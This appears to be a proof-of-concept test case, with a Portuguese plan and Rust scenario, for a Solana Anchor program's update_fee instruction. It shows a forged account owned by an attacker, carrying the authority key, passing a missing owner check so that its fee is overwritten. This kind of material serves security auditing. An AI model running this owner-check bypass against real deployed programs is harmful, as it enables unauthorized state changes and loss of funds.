{
  "plan": "Preparamos uma conta `config` legítima com owner = program_id e admin = authority, e executamos `update_fee` legitimamente para provar o cenário. Em seguida, o ataque fornece uma conta forjada cujo owner é o atacante (diferente do programa), mas cujos bytes 8..40 contêm a pubkey do authority signer, permitindo que a checagem `require_keys_eq!` passe. Medimos o dano verificando que a conta forjada teve seus bytes 40..48 sobrescritos com o novo fee, apesar de não pertencer ao programa.",
  "scenario": "let authority = Pubkey::new_unique();
let config_key = Pubkey::new_unique();

// Conta legítima: owner = program_id, admin = authority, fee inicial = 100
let mut legit_data = anchor_account_data("AdminConfig", &(authority, 100u64));
let legit_config = account(&env.program_id, &legit_data, None);

let metas_legit = vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority, true),
];
let ix_legit = env.anchor_ix("update_fee", &(500u64,), metas_legit);
let contas_legit = vec![
    (config_key, legit_config),
    (authority, wallet(1_000_000_000)),
];
let r_base = env.baseline("update_fee legitimo", &ix_legit, &contas_legit);

// Ataque: conta forjada com owner = atacante, mas bytes 8..40 = authority
let attacker_owner = Pubkey::new_unique();
let mut forged_data = anchor_account_data("AdminConfig", &(authority, 100u64));
let forged_config = account(&attacker_owner, &forged_data, None);

let metas_attack = vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority, true),
];
let ix_attack = env.anchor_ix("update_fee", &(999u64,), metas_attack);
let contas_attack = vec![
    (config_key, forged_config),
    (authority, wallet(1_000_000_000)),
];
let r = env.attack("update_fee com conta forjada", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let cfg = after(&r, &config_key);
    env.effect("conta forjada (owner != program) aceita e fee sobrescrito",
        cfg.owner() == &attacker_owner && read_u64(cfg.data(), 40) == 999u64);
}"
}

